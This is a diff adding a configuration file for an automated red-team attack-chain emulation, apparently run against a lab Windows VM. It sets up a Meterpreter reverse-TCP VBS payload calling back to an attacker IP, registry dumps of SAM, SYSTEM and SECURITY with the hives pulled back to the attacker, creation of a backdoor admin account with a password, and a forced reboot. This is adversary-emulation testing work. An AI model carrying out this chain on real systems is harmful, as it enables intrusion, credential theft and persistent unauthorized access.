@@ -1,0 +1,95 @@
+# Aurora attack-chain parameters file — 20260715T033506Z/chain-002
+#                                        (verification pick #3)
+#
+# Chain narrative (13 steps, MSF-VBS family — sister to pick #5's HTA):
+#   msfvenom VBS payload → MSF handler set → victim manually downloads
+#   VBS to Public → victim opens VBS via wscript.exe (non-elev) →
+#   Meterpreter session 1 (medium) → pgrep discovery → victim RE-opens
+#   the SAME VBS from an ELEVATED cmd/PS ("wscript.exe <path>" from
+#   elevated shell) → Meterpreter session 2 (elevated) → meterpreter-
+#   shell-windows derives cmd from elevated Meterpreter → reg save
+#   HKLM\{sam,system,security} (T1003.002 cred access, no VSS dep —
+#   same technique as pick #5) → meterpreter-download pulls hive
+#   directory back → net user /add (T1136.001 backdoor admin creation)
+#   → **meterpreter-reboot** (T1529 impact via Meterpreter's built-in
+#   reboot command, not `shutdown /r` — semantically same outcome
+#   but different launcher; RDP drops when reboot fires).
+#
+#   VERIFICATION VALUE — three axes not yet hit by previously-verified
+#   chains:
+#     • msfvenom-vbs payload family (build + non-elev-run + elev-run)
+#     • simulate-execute-vbs-windows-root — the last untested new
+#       action from the 5 we authored 2026-07-13
+#     • meterpreter-reboot impact (Meterpreter primitive vs the shell
+#       `shutdown /r` covered by pick #5) — same tactic, different
+#       delivery channel
+#
+# Attacker: Kali at 192.168.56.43 with msfconsole running
+# Victim:   Windows Server 2022 VM, RDP as useradmin (medium-integrity
+#           split token, admin group, NOT built-in Administrator)
+#
+# ⚠ POST-PILOT NOTE ⚠
+#   Step 13 meterpreter-reboot triggers a system reboot (equivalent to
+#   `shutdown /r` but issued through Meterpreter's stdapi). RDP drops
+#   when reboot begins. Re-RDP after ~1-2 min to inspect the post-
+#   chain state (hive files under save_dir, AuroraSvc003 in the local
+#   Administrators, etc.).
+
+pddl_bindings:
+  # used by: 1_msfvenom-vbs.SAVE_PATH
+  # Attacker-side path where msfvenom writes the VBS payload.
+  string2_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.vbs
+
+  # used by: 3_simulate-download-file.SAVE_PATH,
+  #          4_simulate-execute-vbs-windows.VBS_PATH,
+  #          7_simulate-execute-vbs-windows-root.VBS_PATH
+  # Victim-side landing path for the VBS. Same file executed twice —
+  # once via wscript.exe from a normal user shell (step 4) and once
+  # from an elevated shell (step 7) to establish the two Meterpreter
+  # sessions.
+  string4_var_in_plan: C:\Users\Public\chain_mp.vbs
+
+  # used by: 10_art-t1003_002-reg-save-sam.save_dir,
+  #          11_meterpreter-download.remote_path
+  # Directory on target for the 3-hive dump. Same sloppy planner
+  # unification as pick #5 (save_dir=directory vs remote_path=file
+  # gets merged into one var); Meterpreter's download handles the
+  # directory recursively, so hives arrive on attacker plus whatever
+  # else is in Public. Post-2.0 fix documented in pick #5 header.
+  string0_var_in_plan: C:\Users\Public
+
+steps:
+  "1_msfvenom-vbs":
+    LHOST: 192.168.56.43       # attacker IP baked into Meterpreter VBS payload
+    LPORT: 4444                # must match handler LPORT in step 2
+
+  "2_set-msf-payload-handler-for-file":
+    LHOST: 192.168.56.43                            # match step 1 LHOST
+    LPORT: 4444                                     # match step 1 LPORT
+    payload_name: windows/meterpreter/reverse_tcp   # match msfvenom -p in step 1
+
+  "3_simulate-download-file":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP
+    LPORT: 8000                # `python -m http.server 8000` on Kali
+                               # from msf_save/ dir — serves chain_mp.vbs
+
+  "6_meterpreter-pgrep":
+    pattern: explorer          # match any process containing "explorer"
+                               # — harmless discovery target on Windows
+                               # (Explorer.exe always running for
+                               # interactive session);
+                               # same choice as chain-002-fixed
+
+  "11_meterpreter-download":
+    output_dir: '/tmp'         # attacker-side dir where the downloaded
+                               # hive-directory content lands
+
+  "12_art-t1136_001-net-user-add":
+    username: 'AuroraSvc003'   # unique to avoid chain-005 (AuroraSvc005) +
+                               # chain-001-fixed (AuroraPilot001) leftover.
+                               # If a prior run left this account:
+                               # `net user AuroraSvc003 /delete` on target
+                               # first.
+    password: 'CplexPass!23'   # 12 chars — under Windows 14-char legacy
+                               # warning threshold (chain-001-fixed pilot
+                               # diagnostic surfaced this)
